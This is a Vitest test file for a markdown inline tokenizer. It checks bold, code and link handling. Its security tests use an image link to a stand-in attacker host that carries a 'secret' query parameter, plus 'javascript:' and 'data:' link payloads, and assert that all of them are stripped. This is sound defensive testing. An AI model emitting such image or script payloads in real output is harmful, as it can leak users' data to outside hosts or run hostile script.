import { describe, expect, it } from "vitest";
import { inline } from "./inline";

describe("inline", () => {
  it("passes plain text through", () => {
    expect(inline("plain")).toEqual([{ kind: "text", text: "plain" }]);
  });

  it("picks out **bold** and `code`", () => {
    expect(inline("is **$128k** via `HiBob`")).toEqual([
      { kind: "text", text: "is " },
      { kind: "bold", text: "$128k" },
      { kind: "text", text: " via " },
      { kind: "code", text: "HiBob" },
    ]);
  });

  it("keeps only the label of [label](url) links, since corpus-relative urls don't resolve", () => {
    expect(inline("see [the calculator](/handbook/x) now")).toEqual([
      { kind: "text", text: "see " },
      { kind: "text", text: "the calculator" },
      { kind: "text", text: " now" },
    ]);
  });

  it("keeps absolute links as links", () => {
    expect(inline("[site](https://a.test)")).toEqual([
      { kind: "link", text: "site", href: "https://a.test" },
    ]);
  });

  it("never turns a markdown image into a link or a fetch, even an absolute one", () => {
    const out = inline("Done [1]. ![status](https://collect.evil.test/log?d=secret)");
    expect(out.some((t) => t.kind === "link")).toBe(false);
    expect(JSON.stringify(out)).not.toContain("collect.evil.test");
    expect(out.map((t) => t.text).join("")).toBe("Done [1]. (image removed)");
  });

  it("drops an image nested inside a link", () => {
    const out = inline("[![x](https://e.test/a.png)](https://e.test/?d=1)");
    expect(JSON.stringify(out)).not.toContain("a.png");
  });

  it("only allows http(s) links, never javascript: or data:", () => {
    expect(inline("[x](javascript:alert(1))").some((t) => t.kind === "link")).toBe(false);
    expect(inline("[x](data:text/html,hi)").some((t) => t.kind === "link")).toBe(false);
  });
});
